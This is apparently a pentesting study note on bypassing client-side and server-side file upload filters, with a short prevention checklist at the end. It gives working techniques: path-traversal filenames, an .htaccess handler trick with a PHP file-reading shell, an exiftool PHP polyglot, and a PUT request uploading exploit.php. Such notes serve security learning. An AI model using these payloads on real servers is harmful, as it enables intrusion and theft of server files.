# 

# File Upload Vulnerability

## ByPass Client Side Filterin

1. Turn of JavaScript But Make Sure the Website doesn't require Javascript in order to provide basic functionality.

2. Intercept and modify the incoming page. Using Burpsuite
   
   EX:
   
           1-Intercept on to get This Request 
           2-Right Click and choose -> Do Intercept
           3-Response This request 
           4-Forward
           5-And Delete JS code Filter

3. Send the file directly to the upload point.
   
   Why use the webpage with the filter,when you can send the file directly using a tool. like curl
   
       curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>

4. Edit Content-Type: header to
   
           1-Upload File With Accepted Extention
           2-Intercept This Request 
           3-Edit Content-Type to -> Content-Type:text/x-php or image/png -> would you want
           3-and Edit file Extention to what you want

5. File Upload via Path Traversal 
   
           Content-Disposition: form-data; name="avatar"; filename="../get_f_c.php"
           Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fget_f_c.php"
       
           GET /files/avatars/../get_f_c.php
           GET /files/avatars/..%2get_f_c.php

6. Test them using some uppercase letters
   
         pHp, .pHP5, .PhAr ...

7. using .htaccess file
   
   this file is the file of configration in appache you can add configration on it to accept any extension ike .shell , .test then you should aupload two fils file .htaccess 
   
   file One
   
       Content-Disposition: form-data; name="avatar"; filename=".htaccess"
       Content-Type: text/plain
       AddType application/x-httpd-php .shell
   
   flle Two
   
       Content-Disposition: form-data; name="avatar"; filename="shell.shell"
       Content-Type: image/png
       <?php echo file_get_contents('/path/to/target/file'); ?>

--- 

## ByPass ServerSide Filtering

1. First You have to perform a lot of testing to build up an idea of what is or is not allowed through the filter.

2. Try All Possible Extention work for The Same Thing You Want https://book.hacktricks.xyz/pentesting-web/file-upload

3. Magic Numbers
   
   see this site To Know Your Extention Magic Number
   
   https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5
   
   https://en.wikipedia.org/wiki/List_of_file_signatures
   
   Use Any hex editor to Edit First bits. Like hexeditor
   
   | .jpg | ff d8 ff e0 |
   | ---- | ----------- |
   | .png | ff d8 ff e0 |
   
   or using exftool using this script
   
       exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
   
   use Command `file filename` to know if the magic Numbers work

4. Execute it before deleteing
   
    Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.
   
   That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation.
   
   For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.
   
   These vulnerabilities are often extremely subtle, making them difficult to detect during blackbox testing unless you can find a way to leak the relevant source code. 
   
   EX:
   
   [Lab: Web shell upload via race condition | Web Security Academy](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

5. Outher Vulnerability
   
   ##### Uploading malicious client-side scripts
   
   Although you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can potentially use `<script>` tags to create <u>stored XSS</u> payloads.
   
   If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to same-origin policy restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.
   
   ##### Exploiting vulnerabilities in the parsing of uploaded files
   
   If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for <u>XXE injection</u> attacks.
   
   ### Uploading files using PUT
   
   It's worth noting that some web servers may be configured to support `PUT` requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.
   
       PUT /images/exploit.php HTTP/1.1
       Host: vulnerable-website.com
       Content-Type: application/x-httpd-php
       Content-Length: 49
       <?php echo file_get_contents('/path/to/file'); ?>
   
   Tip
   
   You can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.

## How to prevent file upload vulnerabilities

Allowing users to upload files is commonplace and doesn't have to be dangerous as long as you take the right precautions. In general, the most effective way to protect your own websites from these vulnerabilities is to implement all of the following practices:

- Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload. 

- Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (`../`).

-  Rename uploaded files to avoid collisions that may cause existing files to be overwritten. 

-  Do not upload files to the server's permanent filesystem until they have been fully validated. 

-  As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms. 
